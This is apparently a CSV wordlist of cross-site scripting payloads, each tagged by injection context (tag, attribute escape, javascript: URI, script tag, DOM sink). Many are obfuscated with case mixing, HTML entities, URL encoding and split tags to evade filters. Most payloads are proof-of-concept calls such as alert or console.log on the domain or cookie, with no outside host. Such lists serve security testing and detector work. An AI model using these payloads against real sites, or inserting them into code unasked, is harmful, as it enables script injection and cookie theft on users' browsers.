payload,context
%3Cimg onload=prompt(document.domain)/%3E,tag_injection
J&#97;VasCriPt:ConSolE.lOg(LocAtiOn.HasH),js_uri
<img onload=console.log(document.cookie)/>,tag_injection
""" on&#97;nim&#97;tionc&#97;nc&#101;l=&#97;l&#101;rt(1) """,attribute_escape
"J&#97;VasCriPt:AleRt(StrIng.frOmCHarCodE(88,83,83))",js_uri
<imG oNrePeaT=cOnsOle.loG(dOcuMenT.dOmaIn)/>,tag_injection
<img on&#101;rror=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)/>,tag_injection
%22><img onend=console.log(document.domain)>,tag_injection
<imG oNerRor=prOmpT('XSS')/>,tag_injection
"%22><img onanimationstart=confirm(String.fromCharCode(88,83,83))>",tag_injection
"""><img onanimationstart=confirm(String.fromCharCode(88,83,83))>",tag_injection
"<scRipT>cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))</scRipT>",script_injection
"<script>alert(String.fromCharCode(88,83,83))</script>",script_injection
%22 onload=alert(document.domain) %22,attribute_escape
<img onerror=prompt('XSS')/>,tag_injection
j&#97;v&#97;script:confirm('XSS'),js_uri
%3Cimg onload=alert(location.hash)/%3E,tag_injection
%3Cimg onload=prompt(document.domain)%3E,tag_injection
"<img on&#101;nd=prompt(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection
"""><img onload=confirm(location.hash)>",tag_injection
"""><img onanimationend=confirm(1)>",tag_injection
%3Cscript%3E//console.log(location.hash)%3C/script%3E,script_injection
' onbegin=confirm(document.cookie) ',attribute_escape
"%22 onanimationend=confirm(String.fromCharCode(88,83,83)) %22",attribute_escape
<scRipT>//prOmpT(dOcuMenT.dOmaIn)</sCriPt>,script_injection
<img onrepeat=confirm(1)/>,tag_injection
%22 onload=confirm(document.domain) %22,attribute_escape
<imG oNanImaTioNitEraTioN=cOnsOle.loG(dOcuMenT.cOokIe)>,tag_injection
<scr	ipt>/*/confirm(document.domain)</scr	ipt>,script_injection
"document.body.innerHTML=""<img src=x onerror=confirm(document.domain)>""",dom_sink
javascr	ipt:console.log(document.domain),js_uri
' oNanImaTioNcaNceL=aLerT(1) ',attribute_escape
"setTimeout(""prompt(document.cookie)"",0)",dom_sink
' onanimationstart=confirm('XSS') ',attribute_escape
%27 onanimationiteration=prompt(document.domain) %27,attribute_escape
<imG oNanImaTioNitEraTioN=cOnsOle.loG(dOcuMenT.dOmaIn)>,tag_injection
%22 onfocus=console.log(1) autofocus=%22,attribute_escape
<scr	ipt>/*/console.log(location.hash)</scr	ipt>,script_injection
J&#97;VasCriPt:ProMpt(loCatIon.haSh),js_uri
"<script>prompt(String.fromCh&#97;rCod&#101;(88,83,83))</script>",script_injection
<img on&#97;nim&#97;tion&#101;nd=prompt(docum&#101;nt.dom&#97;in)>,tag_injection
"""><Img onRepEat=prOmpT(lOcaTioN.hAsh)>",tag_injection
j&#97;v&#97;script:void(confirm(docum&#101;nt.cooki&#101;)),js_uri
%22 onanimationiteration=confirm(location.hash) %22,attribute_escape
<img onload=console.log(document.cookie)>,tag_injection
<scr	ipt>//console.log(document.domain)</scr	ipt>,script_injection
"%3Cimg onrepeat=console.log(String.fromCharCode(88,83,83))/%3E",tag_injection
' onend=prompt(document.domain) ',attribute_escape
%22 onbegin=alert(%27XSS%27) %22,attribute_escape
%22 onfocus=prompt(document.domain) autofocus=%22,attribute_escape
"EvaL(""AleRt(LocAtiOn.HasH)"")",dom_sink
%3Cimg onend=alert(location.hash)%3E,tag_injection
<scr	ipt>/*/console.log(1)</scr	ipt>,script_injection
<script>alert`'XSS'`</script>,script_injection
""" onanimationstart=console.log(1) """,attribute_escape
<img onbegin=console.log(document.cookie)/>,tag_injection
"document.body.innerHTML=%22<img src=x onerror=prompt(String.fromCharCode(88,83,83))>%22",dom_sink
JavAscRipT:cOnsOle.loG(lOcaTioN.hAsh),js_uri
"location.href=""javascript:alert(document.cookie)""",dom_sink
"javascript:void(console.log(String.fromCharCode(88,83,83)))",js_uri
"""%3E%3Cimg onload=prompt(1)%3E",tag_injection
"document.write(""<img src=x onerror=prompt(1)>"")",dom_sink
""" oNloAd=AleRt(StrIng.frOmCHarCodE(88,83,83)) """,attribute_escape
%3Cimg onbegin=console.log('XSS')/%3E,tag_injection
"DocUmeNt.BodY.iNneRHTML=""<iMg Src=x OneRroR=cOnfIrm(loCatIon.haSh)>""",dom_sink
%22><img onanimationiteration=confirm(1)>,tag_injection
"""><img onr&#101;p&#101;&#97;t=&#97;l&#101;rt('XSS')>",tag_injection
"j&#97;v&#97;script:void(consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)))",js_uri
"""><Img onBegIn=ConFirM(1)>",tag_injection
""" onend=prompt(String.fromCharCode(88,83,83)) """,attribute_escape
%3Cscript%3E/*/prompt(document.domain)%3C/script%3E,script_injection
"""><img on&#101;nd=confirm(1)>",tag_injection
""" onb&#101;gin=consol&#101;.log(loc&#97;tion.h&#97;sh) """,attribute_escape
<scr	ipt>//alert(location.hash)</scr	ipt>,script_injection
""" on&#97;nim&#97;tionst&#97;rt=consol&#101;.log(docum&#101;nt.dom&#97;in) """,attribute_escape
"' on&#97;nim&#97;tionst&#97;rt=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
"""><img on&#97;nim&#97;tionc&#97;nc&#101;l=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)>",tag_injection
' on&#97;nim&#97;tionit&#101;r&#97;tion=&#97;l&#101;rt(docum&#101;nt.dom&#97;in) ',attribute_escape
"setTimeout(%22confirm(String.fromCharCode(88,83,83))%22,0)",dom_sink
"""><img onanimationiteration=console.log(document.domain)>",tag_injection
%22 onrepeat=confirm(%27XSS%27) %22,attribute_escape
<imG oNanImaTioNitEraTioN=cOnfIrm(doCumEnt.doMaiN)/>,tag_injection
<imG oNloAd=AleRt(LocAtiOn.HasH)/>,tag_injection
"eval(""\u0061lert(document.cookie)"")",dom_sink
"""><img on&#101;rror=consol&#101;.log(1)>",tag_injection
"""%3E%3Cimg onanimationiteration=console.log(document.cookie)%3E",tag_injection
"%22 onfocus=confirm(String.fromCharCode(88,83,83)) autofocus=%22",attribute_escape
' oNbeGin=alErt(loCatIon.haSh) ',attribute_escape
<scr	ipt>prompt(document.cookie)</scr	ipt>,script_injection
"""><img on&#101;nd=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)>",tag_injection
%3Cscript%3E/*/console.log(location.hash)%3C/script%3E,script_injection
<scRipT>cOnfIrm(doCumEnt.coOkiE)</scRipT>,script_injection
"""><img onanimationend=confirm('XSS')>",tag_injection
<img onanimationiteration=confirm('XSS')/>,tag_injection
%3Cimg onend=confirm(document.domain)/%3E,tag_injection
%3Cimg onanimationcancel=prompt(1)/%3E,tag_injection
%22 onload=confirm(location.hash) %22,attribute_escape
' on&#97;nim&#97;tionit&#101;r&#97;tion=consol&#101;.log(loc&#97;tion.h&#97;sh) ',attribute_escape
<script>confirm(docum&#101;nt.dom&#97;in)</script>,script_injection
' oNloAd=ConFirM(1) ',attribute_escape
%27 onload=console.log(1) %27,attribute_escape
"""><img onload=\u0061lert('XSS')>",tag_injection
"' oNanImaTioNenD=cOnfIrm(StRinG.fRomChaRCoDe(88,83,83)) '",attribute_escape
<imG oNenD=cOnfIrm(doCumEnt.doMaiN)>,tag_injection
""" onend=\u0061lert(String.fromCharCode(88,83,83)) """,attribute_escape
<img onanimationiteration=confirm(1)>,tag_injection
""" onb&#101;gin=consol&#101;.log('XSS') """,attribute_escape
<img onload=\u0061lert('XSS')>,tag_injection
<scr	ipt>confirm`1`</scr	ipt>,script_injection
JavAscRipT:pRomPt(1),js_uri
"j&#97;v&#97;script:void(&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)))",js_uri
<img onload=console.log(1)/>,tag_injection
<img onend=confirm(%27XSS%27)>,tag_injection
j&#97;vascript:prompt('XSS'),js_uri
"SetTimEouT(""ProMpt('XSS')"",0)",dom_sink
j&#97;vascript:\u0061lert(document.cookie),js_uri
' onanimationstart=prompt(document.domain) ',attribute_escape
<img onanimationstart=confirm('XSS')>,tag_injection
<img onanimationiteration=prompt(document.cookie)/>,tag_injection
' onload=alert('XSS') ',attribute_escape
' oNerRor=alErt(doCumEnt.coOkiE) ',attribute_escape
' onanimationend=\u0061lert(document.domain) ',attribute_escape
""" onanimationcancel=\u0061lert(1) """,attribute_escape
""" oNerRor=coNfiRm(DocUmeNt.CooKie) """,attribute_escape
<img onanimationend=prompt(document.domain)>,tag_injection
%27 onanimationend=confirm(document.domain) %27,attribute_escape
""" onbegin=prompt(document.domain) """,attribute_escape
""" onend=\u0061lert('XSS') """,attribute_escape
<scRipT>/X/cOnsOle.loG(dOcuMenT.cOokIe)</sCriPt>,script_injection
""" onload=prompt(1) """,attribute_escape
"docum&#101;nt.writ&#101;(""<img src=x on&#101;rror=prompt(docum&#101;nt.cooki&#101;)>"")",dom_sink
"%22 onend=console.log(String.fromCharCode(88,83,83)) %22",attribute_escape
<img onlo&#97;d=consol&#101;.log(1)/>,tag_injection
<script>/*/prompt(%27XSS%27)</script>,script_injection
<img onanimationstart=confirm(document.cookie)/>,tag_injection
""" oNrePeaT=pRomPt(1) """,attribute_escape
""" onanimationstart=confirm(location.hash) """,attribute_escape
"<imG oNbeGin=prOmpT(STriNg.FroMChArCOde(88,83,83))>",tag_injection
<script>prompt`'XSS'`</script>,script_injection
<imG oNanImaTioNitEraTioN=pRomPt(LocAtiOn.HasH)/>,tag_injection
"javascr	ipt:void(confirm(String.fromCharCode(88,83,83)))",js_uri
<imG oNerRor=coNsoLe.Log(1)/>,tag_injection
<img onb&#101;gin=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)/>,tag_injection
"""><img onbegin=\u0061lert(location.hash)>",tag_injection
""" oNanImaTioNstArt=prOmpT(STriNg.FroMChArCOde(88,83,83)) """,attribute_escape
' onanimationcancel=alert(document.cookie) ',attribute_escape
"%27 onanimationiteration=alert(String.fromCharCode(88,83,83)) %27",attribute_escape
<scr	ipt>prompt`document.cookie`</scr	ipt>,script_injection
"""><img onanimationend=\u0061lert(location.hash)>",tag_injection
"' onerror=confirm(String.fromCharCode(88,83,83)) '",attribute_escape
%3Cimg onanimationend=prompt('XSS')%3E,tag_injection
j&#97;vascr	ipt:confirm(location.hash),js_uri
<img onrepeat=alert('XSS')/>,tag_injection
<img onanimationend=prompt('XSS')/>,tag_injection
"""><img onanimationend=console.log(String.fromCharCode(88,83,83))>",tag_injection
"""><img on&#97;nim&#97;tion&#101;nd=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
""" oNbeGin=alErt(doCumEnt.doMaiN) """,attribute_escape
<img onbegin=\u0061lert(document.cookie)/>,tag_injection
<scRipT>//coNsoLe.Log(doCumEnt.doMaiN)</scRipT>,script_injection
%3Cscript%3Ealert(document.cookie)%3C/script%3E,script_injection
""" oNanImaTioNitEraTioN=cOnfIrm(doCumEnt.doMaiN) """,attribute_escape
' onanimationiteration=\u0061lert(1) ',attribute_escape
"<imG oNloAd=ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))/>",tag_injection
"location.href=""javascript:\u0061lert(document.domain)""",dom_sink
"""><img onlo&#97;d=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)>",tag_injection
"""%3E%3Cimg onrepeat=alert(String.fromCharCode(88,83,83))%3E",tag_injection
"%3Cimg onbegin=alert(String.fromCharCode(88,83,83))/%3E",tag_injection
%22 onanimationend=alert(document.domain) %22,attribute_escape
<scr	ipt>//confirm(location.hash)</scr	ipt>,script_injection
"document.write(""<img src=x onerror=confirm(location.hash)>"")",dom_sink
"JavAscRipT:vOid(alErt(StRinG.fRomChaRCoDe(88,83,83)))",js_uri
%3Cimg onanimationiteration=console.log(document.domain)/%3E,tag_injection
""" onrepeat=\u0061lert(document.cookie) """,attribute_escape
"""><Img onAniMatIonIteRatIon=coNsoLe.Log(doCumEnt.doMaiN)>",tag_injection
<img on&#97;nim&#97;tionst&#97;rt=prompt(docum&#101;nt.dom&#97;in)>,tag_injection
<img onanimationcancel=alert(%27XSS%27)/>,tag_injection
"""><img onend=confirm(document.cookie)>",tag_injection
"""><Img onAniMatIonStaRt=ConFirM(dOcuMenT.cOokIe)>",tag_injection
<scRipT>aLerT`dOcuMenT.cOokIe`</sCriPt>,script_injection
<img onb&#101;gin=consol&#101;.log(loc&#97;tion.h&#97;sh)/>,tag_injection
' oNenD=pRomPt(LocAtiOn.HasH) ',attribute_escape
""" onfocus=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) &#97;utofocus=""",attribute_escape
"""><img onb&#101;gin=prompt(loc&#97;tion.h&#97;sh)>",tag_injection
""" onr&#101;p&#101;&#97;t=&#97;l&#101;rt(1) """,attribute_escape
<script>/*/confirm(loc&#97;tion.h&#97;sh)</script>,script_injection
"<scRipT>/*/cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))</scRipT>",script_injection
"' on&#101;nd=confirm(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
%3Cimg onanimationiteration=console.log('XSS')%3E,tag_injection
"EvaL(""AleRt(DocUmeNt.DomAin)"")",dom_sink
%22 onanimationstart=alert(location.hash) %22,attribute_escape
"eval(""confirm(document.domain)"")",dom_sink
<img onanimationend=prompt(1)/>,tag_injection
%3Cimg onanimationstart=alert(document.cookie)%3E,tag_injection
"""><img onend=console.log(document.cookie)>",tag_injection
""" onbegin=\u0061lert(document.cookie) """,attribute_escape
"""><img on&#97;nim&#97;tion&#101;nd=confirm(docum&#101;nt.dom&#97;in)>",tag_injection
"' onb&#101;gin=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
<imG oNrePeaT=cOnsOle.loG(lOcaTioN.hAsh)>,tag_injection
%22 onanimationstart=console.log(location.hash) %22,attribute_escape
%3Cimg onerror=alert('XSS')%3E,tag_injection
%27 onrepeat=console.log(document.domain) %27,attribute_escape
""" on&#97;nim&#97;tionit&#101;r&#97;tion=confirm(docum&#101;nt.cooki&#101;) """,attribute_escape
<imG oNanImaTioNenD=cOnfIrm(loCatIon.haSh)/>,tag_injection
""" on&#97;nim&#97;tionit&#101;r&#97;tion=confirm(loc&#97;tion.h&#97;sh) """,attribute_escape
j&#97;v&#97;script:prompt(1),js_uri
%27 onerror=confirm(document.cookie) %27,attribute_escape
"""><img onbegin=console.log(1)>",tag_injection
' onrepeat=alert(location.hash) ',attribute_escape
""" onanimationiteration=alert(String.fromCharCode(88,83,83)) """,attribute_escape
<img onlo&#97;d=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection
"' onanimationiteration=confirm(String.fromCharCode(88,83,83)) '",attribute_escape
javascr	ipt:alert(location.hash),js_uri
%3Cscript%3E/*/console.log('XSS')%3C/script%3E,script_injection
""" onanimationstart=\u0061lert('XSS') """,attribute_escape
<scr	ipt>/*/alert(document.cookie)</scr	ipt>,script_injection
"""><img onanimationstart=confirm('XSS')>",tag_injection
<imG oNanImaTioNstArt=alErt(doCumEnt.coOkiE)>,tag_injection
' onerror=\u0061lert('XSS') ',attribute_escape
"%3Cscript%3Econsole.log(String.fromCharCode(88,83,83))%3C/script%3E",script_injection
<script>//confirm(docum&#101;nt.dom&#97;in)</script>,script_injection
<img on&#97;nim&#97;tionc&#97;nc&#101;l=&#97;l&#101;rt(1)>,tag_injection
<img on&#97;nim&#97;tionc&#97;nc&#101;l=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)/>,tag_injection
""" onerror=confirm(document.domain) """,attribute_escape
"location.href=""javascript:console.log('XSS')""",dom_sink
"document.write(""<img src=x onerror=prompt('XSS')>"")",dom_sink
<img onend=console.log('XSS')/>,tag_injection
<img onanimationcancel=alert(location.hash)/>,tag_injection
"document.body.innerHTML=""<img src=x onerror=console.log(document.domain)>""",dom_sink
"%22 onanimationiteration=prompt(String.fromCharCode(88,83,83)) %22",attribute_escape
"document.write(""<img src=x onerror=prompt(document.domain)>"")",dom_sink
<img onerror=confirm('XSS')/>,tag_injection
"""%3E%3Cimg onload=confirm(location.hash)%3E",tag_injection
"setTimeout(""alert('XSS')"",0)",dom_sink
"<img on&#101;rror=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection
%3Cimg onrepeat=prompt(location.hash)%3E,tag_injection
"docum&#101;nt.body.inn&#101;rHTML=""<img src=x on&#101;rror=prompt(docum&#101;nt.dom&#97;in)>""",dom_sink
""" onerror=alert(document.domain) """,attribute_escape
"""><img onlo&#97;d=prompt(loc&#97;tion.h&#97;sh)>",tag_injection
j&#97;v&#97;script:void(&#97;l&#101;rt(docum&#101;nt.dom&#97;in)),js_uri
"%3Cimg onrepeat=confirm(String.fromCharCode(88,83,83))%3E",tag_injection
javascr	ipt:void(alert('XSS')),js_uri
%3Cimg onrepeat=confirm('XSS')/%3E,tag_injection
"<img onend=alert(String.fromCharCode(88,83,83))>",tag_injection
%27 onanimationiteration=confirm(%27XSS%27) %27,attribute_escape
"""><img onanimationstart=\u0061lert(1)>",tag_injection
<img on&#97;nim&#97;tionst&#97;rt=confirm(1)>,tag_injection
"""><img on&#101;rror=prompt(docum&#101;nt.dom&#97;in)>",tag_injection
"j&#97;vascript:\u0061lert(String.fromCharCode(88,83,83))",js_uri
"""%3E%3Cimg onanimationcancel=alert(String.fromCharCode(88,83,83))%3E",tag_injection
<imG oNbeGin=coNfiRm(LocAtiOn.HasH)>,tag_injection
<img on&#97;nim&#97;tionc&#97;nc&#101;l=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)/>,tag_injection
%3Cimg onrepeat=alert(document.cookie)/%3E,tag_injection
""" onb&#101;gin=consol&#101;.log(docum&#101;nt.dom&#97;in) """,attribute_escape
<scr	ipt>console.log(location.hash)</scr	ipt>,script_injection
""" oNenD=cOnsOle.loG(lOcaTioN.hAsh) """,attribute_escape
<img onload=console.log(location.hash)>,tag_injection
"<img onrepeat=\u0061lert(String.fromCharCode(88,83,83))/>",tag_injection
"<img onend=confirm(String.fromCharCode(88,83,83))/>",tag_injection
"' onlo&#97;d=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
<img on&#97;nim&#97;tionit&#101;r&#97;tion=&#97;l&#101;rt(1)>,tag_injection
"""><img onrepeat=console.log('XSS')>",tag_injection
""" onerror=\u0061lert(location.hash) """,attribute_escape
' onload=prompt(document.domain) ',attribute_escape
""" oNrePeaT=cOnfIrm('XSS') """,attribute_escape
%3Cimg onanimationend=alert(1)/%3E,tag_injection
' oNrePeaT=pRomPt(DocUmeNt.DomAin) ',attribute_escape
<script>/*/alert('XSS')</script>,script_injection
<imG oNanImaTioNenD=cOnfIrm(doCumEnt.coOkiE)>,tag_injection
"""%3E%3Cimg onerror=confirm(document.cookie)%3E",tag_injection
<img onerror=\u0061lert(location.hash)>,tag_injection
""" oNerRor=alErt(loCatIon.haSh) """,attribute_escape
""" onrepeat=alert(document.domain) """,attribute_escape
<img onload=console.log(document.domain)>,tag_injection
<img onrepeat=\u0061lert(1)/>,tag_injection
<img onanimationstart=confirm(document.domain)>,tag_injection
%22><img onend=console.log(location.hash)>,tag_injection
%3Cimg onbegin=confirm(document.domain)/%3E,tag_injection
""" oNanImaTioNitEraTioN=pRomPt(DocUmeNt.CooKie) """,attribute_escape
<imG oNerRor=alErt(1)/>,tag_injection
%3Cimg onanimationend=prompt(location.hash)%3E,tag_injection
""" oNloAd=ConFirM(dOcuMenT.cOokIe) """,attribute_escape
' on&#97;nim&#97;tionst&#97;rt=prompt(loc&#97;tion.h&#97;sh) ',attribute_escape
"document.write(""%3Cimg src=x onerror=console.log(String.fromCharCode(88,83,83))%3E"")",dom_sink
%3Cscript%3Econfirm(document.domain)%3C/script%3E,script_injection
<img onanimationiteration=console.log('XSS')>,tag_injection
%3Cimg onbegin=alert(document.domain)%3E,tag_injection
"%22><img onload=prompt(String.fromCharCode(88,83,83))>",tag_injection
%22 onbegin=prompt(document.cookie) %22,attribute_escape
%22><img onrepeat=alert(location.hash)>,tag_injection
' on&#101;rror=consol&#101;.log('XSS') ',attribute_escape
""" oNanImaTioNstArt=coNfiRm('XSS') """,attribute_escape
' on&#97;nim&#97;tionc&#97;nc&#101;l=&#97;l&#101;rt(loc&#97;tion.h&#97;sh) ',attribute_escape
"%3Cimg onload=console.log(String.fromCharCode(88,83,83))%3E",tag_injection
%3Cimg onanimationcancel=prompt(1)%3E,tag_injection
javascript:void(console.log(1)),js_uri
<img on&#97;nim&#97;tionst&#97;rt=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection
%27 onend=prompt(document.cookie) %27,attribute_escape
<script>prompt(document.cookie)</script>,script_injection
<img on&#97;nim&#97;tionit&#101;r&#97;tion=confirm(docum&#101;nt.dom&#97;in)/>,tag_injection
""" oNanImaTioNenD=pRomPt(DocUmeNt.DomAin) """,attribute_escape
<imG oNbeGin=alErt(1)/>,tag_injection
javascript:void(prompt(%27XSS%27)),js_uri
""" on&#101;rror=confirm(1) """,attribute_escape
%22 onbegin=prompt(location.hash) %22,attribute_escape
%22><img onanimationiteration=console.log(document.domain)>,tag_injection
